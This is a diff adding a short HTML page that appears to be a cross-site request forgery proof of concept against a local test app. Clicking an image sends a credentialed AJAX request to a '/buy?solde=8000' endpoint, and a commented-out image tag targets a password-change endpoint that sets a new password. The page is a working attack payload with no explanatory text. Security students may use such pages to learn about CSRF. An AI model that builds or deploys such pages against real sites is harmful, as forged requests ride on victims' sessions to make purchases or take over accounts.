@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/js-cookie@rc/dist/js.cookie.min.js"></script>
+    <script type="text/javascript">
+        //src="http://127.0.0.1:3000/buy?solde=8000"
+        function show() {
+            //let c = Cookies.get('login')
+            //Cookies.remove('login')
+            //Cookies.set("login2", "aaa", { domain:"localhost", secure: true, sameSite:"none" });
+            //console.log(c);
+            $.ajax({
+                xhrFields: {
+                    withCredentials: true
+                },
+                url: 'http://localhost:3000/buy?solde=8000',
+                type: 'GET',
+                //crossDomain: true,
+                //dataType: "json",
+                //headers: {"Cookie" : "login=aaa"},
+
+                success: function(response) {
+                    console.log("success");
+                },
+                error: function() {
+                    console.log("failed!");
+                }
+            })
+        }
+    </script>
+</head>
+<body>
+<!--    <img src="http://127.0.0.1:3000/changepasswd?npasswd=www&cnpasswd=www" alt="">-->
+    <img src="../image.png" onclick="show()"/>
+</body>
+
+
+</html>
